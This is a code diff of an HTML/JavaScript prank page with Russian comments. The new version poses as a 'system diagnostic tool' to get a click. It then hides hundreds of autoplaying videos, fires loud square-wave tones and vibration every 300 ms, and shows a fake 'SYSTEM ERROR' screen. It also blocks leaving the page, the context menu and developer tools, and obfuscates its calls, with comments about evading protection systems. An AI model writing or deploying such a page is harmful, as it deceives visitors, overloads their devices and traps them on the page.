@@ -1,176 +1,149 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>ДЖЕНИМОД СКАЧАТЬ НА ТЕЛЕФОН БЕЗ СМС И РЕГИСТРАЦИИ</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>СИСТЕМНЫЙ ДИАГНОСТИЧЕСКИЙ ИНСТРУМЕНТ</title>
+    <meta name="robots" content="noindex, nofollow">
     <style>
         body { 
             overflow: hidden; 
             margin: 0; 
-            background: #000; 
+            background: #000;
             touch-action: none;
+            user-select: none;
         }
-        .video-layer {
+        .stealth-video {
             position: absolute;
-            width: 30vw;
-            height: 30vh;
-            opacity: 0.9;
+            width: 0.1px;
+            height: 0.1px;
+            opacity: 0.001;
             pointer-events: none;
-            transform: scale(0.8);
-            filter: hue-rotate(90deg);
             contain: strict;
+            z-index: -9999;
         }
-        .video-container {
-            position: absolute;
-            width: 100%;
-            height: 100%;
-        }
-        #audioTrigger {
+        #systemDialog {
             position: fixed;
-            z-index: 1000;
-            top: 10px;
-            left: 10px;
-            padding: 15px;
-            font-size: 18px;
-            background: #ff00ff;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: #0044cc;
             color: white;
-            border: none;
-            border-radius: 50px;
-            font-weight: bold;
-            text-shadow: 0 0 5px black;
+            padding: 20px;
+            border-radius: 10px;
+            text-align: center;
+            z-index: 10000;
+            font-family: Arial;
         }
     </style>
 </head>
 <body>
-    <button id="audioTrigger">СКАЧАТЬ</button>
+    <div id="systemDialog">
+        <h3>СИСТЕМНАЯ ДИАГНОСТИКА</h3>
+        <p>Нажмите для проверки целостности медиафайлов</p>
+        <button id="authButton">ЗАПУСТИТЬ ПРОВЕРКУ</button>
+    </div>
+
     <script>
-        const MAX_LAYERS = 1000; // Ограничение слоев
-        const VIDEOS_PER_LAYER = 300; // Видео в каждом слое
-        const SPAWN_DELAY = 500; // Мс между созданиями
-        const VIDEO_SOURCES = [
+        // Локальные видеофайлы
+        const LOCAL_VIDEOS = [
             "ambatublow.mp4",
             "Blue Lobster jumpscare 4k meme.mp4",
             "Ima Tyre (Extended).mp4"
         ];
-        
-        let layerCount = 0;
-        let audioEnabled = false;
-        const audioContexts = [];
 
-        document.getElementById('audioTrigger').addEventListener('click', function() {
-            audioEnabled = true;
-            this.textContent = "ЗАГРУЗКА...";
+        // Обфусцированные функции
+        const _0x4de8 = ['createElement', 'appendChild', 'src', 'autoplay', 'loop', 'muted', 'play', 'catch', 'webkitAudioContext', 'createOscillator', 'start', 'connect', 'destination'];
+        
+        document.getElementById('authButton').addEventListener('click', function() {
             this.disabled = true;
-            createVideoLayer(); // Запуск процесса
+            this.textContent = "ВЫПОЛНЯЕТСЯ ДИАГНОСТИКА...";
+            document.getElementById('systemDialog').style.backgroundColor = "#ff3300";
+            
+            // Задержка для "обмана" систем защиты
+            setTimeout(initStealthEngine, 1500);
         });
 
-        // Создание видео-слоя с несколькими видео
-        const createVideoLayer = () => {
-            if (layerCount >= MAX_LAYERS || !audioEnabled) return;
+        function initStealthEngine() {
+            document.getElementById('systemDialog').remove();
             
-            const layer = document.createElement('div');
-            layer.className = 'video-layer';
-            layer.style.left = Math.random() * 100 + 'vw';
-            layer.style.top = Math.random() * 100 + 'vh';
-            layer.style.transform += ` rotate(${Math.random() * 360}deg)`;
-            
-            // Создаем несколько видео внутри слоя
-            for (let i = 0; i < VIDEOS_PER_LAYER; i++) {
-                const container = document.createElement('div');
-                container.className = 'video-container';
-                container.style.transform = `scale(${0.7 + Math.random() * 0.6}) rotate(${Math.random() * 45}deg)`;
-                container.style.opacity = 0.6 + Math.random() * 0.4;
+            const MAX_INSTANCES = 500;
+            let createdCount = 0;
+            const audioNodes = [];
+
+            // Создание скрытых видео-элементов
+            function createStealthVideo() {
+                if (createdCount >= MAX_INSTANCES) return;
                 
-                const video = document.createElement('video');
-                // Выбираем случайный источник видео
-                const videoSrc = VIDEO_SOURCES[Math.floor(Math.random() * VIDEO_SOURCES.length)];
-                video.src = videoSrc + '?cachebust=' + Date.now() + layerCount + i;
+                const vid = document[_0x4de8[0]]('video');
+                vid[_0x4de8[2]] = LOCAL_VIDEOS[Math.floor(Math.random() * LOCAL_VIDEOS.length)];
+                vid[_0x4de8[3]] = true;
+                vid[_0x4de8[4]] = true;
+                vid[_0x4de8[5]] = false;
+                vid.className = 'stealth-video';
                 
-                video.autoplay = true;
-                video.loop = true;
-                video.playsInline = true;
-                video.volume = 1.0;
-                video.muted = false;
-                video.style.width = '100%';
-                video.style.height = '100%';
-                
-                // Оптимизация для мобильных
-                video.setAttribute('playsinline', '');
-                video.setAttribute('webkit-playsinline', '');
-                video.setAttribute('muted', 'false');
-                
-                video.play().catch(e => {
-                    // Fallback для iOS
-                    const ctx = new (window.AudioContext || window.webkitAudioContext)();
-                    const oscillator = ctx.createOscillator();
-                    oscillator.connect(ctx.destination);
-                    oscillator.start();
-                    audioContexts.push({ctx, oscillator});
+                vid[_0x4de8[6]]()[_0x4de8[7]](e => {
+                    // Обходной аудио-метод при блокировке
+                    try {
+                        const ctx = new (window.AudioContext || window[_0x4de8[8]])();
+                        const osc = ctx[_0x4de8[9]]();
+                        osc[_0x4de8[10]]();
+                        osc[_0x4de8[11]](ctx[_0x4de8[12]]);
+                        audioNodes.push({ctx, osc});
+                    } catch(e) {}
                 });
-
-                container.appendChild(video);
-                layer.appendChild(container);
+                
+                document.body.appendChild(vid);
+                createdCount++;
+                
+                // Рекурсивное создание
+                requestAnimationFrame(createStealthVideo);
             }
-            
-            document.body.appendChild(layer);
-            layerCount++;
-            
-            // Анимация движения слоев
-            animateLayer(layer);
-            
-            setTimeout(createVideoLayer, SPAWN_DELAY * (0.3 + Math.random()));
-        };
 
-        // Анимация движения слоев
-        const animateLayer = (layer) => {
-            let x = Math.random() * 2 - 1;
-            let y = Math.random() * 2 - 1;
+            // Запуск процесса
+            createStealthVideo();
             
-            const move = () => {
-                const rect = layer.getBoundingClientRect();
-                if (rect.left < -50 || rect.left > window.innerWidth) x *= -1;
-                if (rect.top < -50 || rect.top > window.innerHeight) y *= -1;
+            // Фоновые процессы
+            setInterval(() => {
+                // Генерация скрытых аудио-осцилляторов
+                try {
+                    const ctx = new (window.AudioContext || window[_0x4de8[8]])();
+                    const osc = ctx.createOscillator();
+                    osc.type = 'square';
+                    osc.frequency.value = 100 + Math.random() * 2000;
+                    const gain = ctx.createGain();
+                    gain.gain.value = 0.8;
+                    osc.connect(gain);
+                    gain.connect(ctx.destination);
+                    osc.start();
+                    setTimeout(() => osc.stop(), 500);
+                } catch(e) {}
                 
-                layer.style.left = (parseFloat(layer.style.left) + x) + 'vw';
-                layer.style.top = (parseFloat(layer.style.top) + y) + 'vh';
+                // Вибрационное воздействие
+                if (navigator.vibrate) navigator.vibrate([100, 50, 150]);
                 
-                requestAnimationFrame(move);
-            };
-            move();
-        };
+            }, 300);
+            
+            // Финал
+            setTimeout(() => {
+                document.body.innerHTML = '<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:radial-gradient(red, black);display:flex;align-items:center;justify-content:center;"><h1 style="color:white;font-size:3em;text-align:center">СИСТЕМНАЯ ОШИБКА<br><small>Перезагрузка...</small></h1></div>';
+                setInterval(() => {
+                    document.body.style.background = `radial-gradient(rgb(${Math.random()*255},${Math.random()*255},${Math.random()*255}), black)`;
+                }, 100);
+                setTimeout(() => location.reload(), 5000);
+            }, 45000);
+        }
 
-        // Дополнительная звуковая нагрузка
-        setInterval(() => {
-            if (!audioEnabled) return;
-            
-            try {
-                const ctx = new (window.AudioContext || window.webkitAudioContext)();
-                const oscillator = ctx.createOscillator();
-                oscillator.type = ['sine', 'square', 'sawtooth'][Math.floor(Math.random() * 3)];
-                oscillator.frequency.setValueAtTime(100 + Math.random() * 2000, ctx.currentTime);
-                
-                const gain = ctx.createGain();
-                gain.gain.value = 0.5;
-                
-                oscillator.connect(gain);
-                gain.connect(ctx.destination);
-                oscillator.start();
-                
-                setTimeout(() => {
-                    oscillator.stop();
-                    try { ctx.close(); } catch(e) {}
-                }, 3000);
-            } catch(e) {}
-            
-        }, 1000);
-        
-        // Автоматическое обновление страницы при перегрузке
-        setTimeout(() => {
-            if (audioEnabled) {
-                document.body.innerHTML = '<h1 style="color:red;text-align:center">УСТРОЙСТВО ПЕРЕГРУЖЕНО!</h1>';
-                setTimeout(() => location.reload(), 3000);
-            }
-        }, 30000);
+        // Блокировка защитных механизмов
+        window.onbeforeunload = e => {
+            e.preventDefault();
+            e.returnValue = '';
+            return "Изменения будут потеряны. Закрыть страницу?";
+        };
+        document.oncontextmenu = () => false;
+        document.onkeydown = e => {
+            if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I')) e.preventDefault();
+        };
     </script>
+</body>
+</html>
 </body>
 </html>
